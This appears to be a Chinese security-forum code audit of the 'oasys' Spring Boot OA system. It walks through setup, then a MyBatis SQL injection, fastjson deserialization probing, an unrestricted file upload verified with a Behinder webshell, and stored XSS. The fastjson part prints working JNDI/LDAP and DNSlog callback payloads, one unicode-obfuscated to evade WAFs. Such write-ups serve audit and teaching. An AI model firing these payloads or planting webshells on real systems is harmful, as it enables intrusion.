项目介绍
====

oasys是一个OA办公自动化系统，使用Maven进行项目管理，基于springboot框架开发的项目，mysql底层数据库，前端采用freemarker模板引擎，Bootstrap作为前端UI框架，集成了jpa、mybatis等框架。作为初学springboot是一个很不错的项目。

项目搭建
====

本项目基于Windows 10系统，Java版本为1.8.0\_261，Mysql使用的为PHPstudy内置的。这里的phpstudy要用给大家的（mysql5.7.26）

使用navicat连接数据库，右键新建连接--》mysql--》oasys

并创建oasys数据库(oasys.sql)：  
使用IDEA打开oasys项目，等待Maven自动加载依赖项，如果时间较长需要自行配置Maven加速源。几个现象表明项目部署成功。pom.xml文件无报错，项目代码已编译为class，Run/Debug Configurations...处显示可以运行。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-e1e2d24feed36d31a212b62dcf1e8c909dbee1d1.png)

修改src/main/resouces/application.properties 配置文件内容，具体如下图所示：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a274072a7b02f66e4b6dc1d9788d30032b907a24.png)  
点击启动Run/Debug Configurations...本项目，启动成功  
浏览器访问http://127.0.0.1:8088，进入登录页面

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-1b1c4a894dbf7ca9627a943cf41b2b4374e12e12.png)

代码审计与漏洞验证
=========

首先审计pom.xml查看整体框架  
本项目引入的组件以及组件版本整理如下。  
组件名称 组件版本

SpringBoot 1.5.6.RELEASE

Mybatis 1.3.0

fastjson 1.2.36

fileupload 1.3.2

data-jpa 1.5.6.RELEASE

Mybatis-sql注入
-------------

全局搜索${ 查找xml文件

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-7a02d757b8ff49990cf5f61c333f9117c6c44ec4.png)  
搜索allDirector方法及返回类型为Map

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-cae297865e33704cb2326093e38af53408fa474f.png)  
outAddress方法中am.allDirector调用该方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-44782ca45714c34ed1b2349524137d7637477d68.png)  
根据代码可以尝试构造数据包

@RequestParam用来处理Content-Type: 为 application/x-www-form-urlencoded编码的内容，提交方式GET、POST。因此在构造数据包时要加入Content-Type:application/x-www-form-urlencoded才能使后端代码获取到对应参数值。

（前端请求传Json对象则后端使用@RequestParam；

前端请求传Json对象的字符串则后端使用@RequestBody。json的Content-Type:application/json或Content-Type:text/json），当然post类型的数据包可以抓取post请求，然后替换掉url和参数值

```php
POST /outaddresspaging HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;x64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language:
zh-CN,zh;q=0.8,zh-TW;q=0.7,zhHK;q=0.5,enUS;q=0.3,en;q=0.2
Connection: close
Content-Type:application/x-www-form-urlencoded
Referer: http://localhost:8088/testsysstatus
Cookie: JSESSIONID=55DD494815FDC35487ED3DB2CA209D6D
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Content-Length: 45

pageNum=1&baseKey=&outtype=&alph=&userId=
```

发送数据包后，代码断点拦截，说明数据包没有问题，下面就是判断注入点  
根据xml注入参

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-2046db2a03ff3e8f22ccf2326d393c8214ea5abc.png)  
根据xml注入参数，以下标红参数为存在注入参数

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-6d373b6e0d80c4f960d1d8cdcffff6a665379a30.png)  
尝试outtype参数1'

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8877c49823f06ba89ec0eb4cbdc6e2895b03eeda.png)  
通过断点，可以按到控制台输出的sql语句，outtype已经写入到了sql语句中

```php
SQL: select count(0) from (SELECT d.\*,u.\*   FROM
aoa\_director\_users AS u LEFT JOIN aoa\_director AS d
ON   d.director\_id = u.director\_id   WHERE
u.user\_id\=? AND u.director\_id is NOT null AND
u.is\_handle\=1        AND d.pinyin LIKE '1%'        
    AND u.catelog\_name = '1''           AND  
(d.user\_name LIKE '%2%'   OR d.phone\_number LIKE
'%2%'   OR d.companyname LIKE '%2%'   OR d.pinyin
LIKE '2%'   OR u.catelog\_name LIKE '%2%'   )      
order by u.catelog\_name) tmp\_count
```

代码审计确认存在sql注入。

fastjson反序列化
------------

fastjson &lt;=1.2.68存在反序列化，则单纯的从版本上来看，本套代码中的版本是1.2.36，存在反序列化的风险查找是否使用了反序列化的两个方法：  
JSON.parse (String text)  
JSON.parseObject(String text)  
通过全局搜索，后端不存在JSON.parse方法的调用，因此这里不存在反序列化，但是存在反序列化的风险，因此依旧建议升级fastjson

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-26caf12514f93875cf9c031fe95c068cba9b23ad.png)

### 判断漏洞是否存在，常见几种方法：

**jndi请求延迟**

首先看这个payload，适用于1.2.47之前版本的fastjson，这里面有一个小技巧，访问一个不常见的外网IP地址，会延迟几秒，访问一个内网地址127.0.0.1 会瞬间返回，那么证明这个POC可用，也间接证明fastjson版本是1.2.47之前的版本。那么在不出网的情况下，可以借助这个POC的延迟效果，知道目标fastjson是&lt;=1.2.47的，进而可以花时间和精力去构造POC实现回显，或者直接打一个内存马。

以下是一个经过unicode编码的payload，一定程度上可以绕过一些waf

```php
{"name":{"\\u0040\\u0074\\u0079\\u0070\\u0065":"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073","\\u0076\\u0061\\u006c":"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c"},"x":{"\\u0040\\u0074\\u0079\\u0070\\u0065":"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c","\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065":"ldap://ip/test111","autoCommit":true}}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-567ab7501a6a49cb951db1e6b312e31433d3edf1.png)  
以下这个POC延迟，证明fastjson版本号**1.1.16&lt;=version&lt;=1.2.24**

{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://137.30.0.1:9999/POC","autoCommit":true}}

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c9854cc4196be650d4e65bde6d4ef6f22174928d.png)

#### 显错判断

这个方法在正常中应有很多，两个POC如下，提交一下两个POC，会抛出异常，有时候会显示出fastjson版本号来。

1\. {"@type": "java.lang.AutoCloseable"  
2\. \["test":1\]   
3\. 输入一些乱码字符，让web应用报错，有时候也会带出来版本号。  
我正常用第三种方法居多

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-1f688d95b1cb2b8ef05659b87da5470238d1a6c0.png)

**DNS请求判断**

搭建不同的fastjson漏洞环境，发现网上很多文章对于各种fastjson漏洞dnslog payload与fastjson版本号的对应描述都不准确，很多还是有错误的。这里我发出自己校勘的结果，不一定准确，仅供大家参考。

以下POC出网，说明fastjson&lt;=1.2.47

{"name":{"@type":"java.net.InetAddress","val":"1247.xxxxx.dnslog.cn"}}

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-ca62ad1cf672e340e2370522b63c4495f5b34543.png)  
以下这个POC出网，说明fastjson&gt;=1.2.37

{{"@type":"java.net.URL","val":"[http://weffewfddd.dnslog.cn"}:"aaa](http://weffewfddd.dnslog.cn)"}

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-b8220580dd124f6198e0db5e3a1cc817dd0bcdfa.png)  
**以下这几个POC，只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的**。误以为能DNS出网，就认为存在fastjson漏洞，这是不正确的。

{"@type":"java.net.Inet6Address","val":"sdffsd.dnslog.cn"}

{"@type":"java.net.Inet4Address","val":"xxxxx.dnslog.cn"}

{"@type":"java.net.InetSocketAddress"{"address":,"val":"wefewffw.dnslog.cn"}}

以下这个POC比较不错，实战中用一用会有意想不到的效果。

{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"<http://allmet.dnslog.cn>"}}""}

Set\[{"@type":"java.net.URL","val":"<http://allmet.dnslog.cn>"}\]

Set\[{"@type":"java.net.URL","val":"<http://allmet.dnslog.cn>"}

{{"@type":"java.net.URL","val":"[http://allmet.dnslog.cn"}:0](http://allmet.dnslog.cn)

文件上传
----

审计过程  
通过对pom.xml的审计，可以看出使用了commons-fileupload,则判断是否存在文件上传，全局搜索fileup

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-b31a597cbf8d137399496c28e2f49ad1488ce659.png)  
对uploadfile方法进行审计，中间使用了fs.savefile()方法对文件进行保存

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-9f8773783e83a0574ac2988f10a248be6f75ebd9.png)  
savefile方法中获取后缀后，直接做了拼接，保存到硬盘中，并没有白名单或者黑名单进行判断过滤

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-31524ff44feee98fb6dad40070b04c61bb09f9f5.png)  
由于是文件上传，可以采用功能查找在文件管理处，使用文件上传功能抓包

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-43fbb1fd7ad1a58594704dbadc500d1220bcbed4.png)

黑盒验证：  
将上传的图片后缀和内容修改为冰蝎马  
从页面未能找到回显路径，但在硬盘中搜索，存在上传的冰蝎马

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-230ec365124f640b470fc99316c461d26c566ca8.png)

xss代码审计
-------

（1）审查全局过滤器

（2）关键词&lt;update 更新数据是否存在数据库中

（3）setAttribute( 方法写入的request中，并进行转发当我们看到框架中使用了data-jpa时，我们就能判断这里的持久层使用ORM映射关系，那么我们就可以搜索setAttribute方法，定位到这个方法也主要是抓包，

系统菜单-》类型管理--》修改

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5c9f9be5825e3e122306a874826d8afe17a567c5.png)  
在TypeSysController.java中，100行将menu写入到req中，在129

行调用save方法将menu保存到数据库中。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-0dd174ba5626caa7877b031c8ce4b349a6007bbc.png)  
最后返回到typeedit

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a8aca7dfb206f27065ef2e0959329586dbf47659.png)  
typeedit.ftl通过el表达式获取值进行回显

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d8750bedf21fb014fc5a274816c820cabe750bb5.png)  
验证：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-91545c35c6da1b09f588be6f8d9459670112f408.png)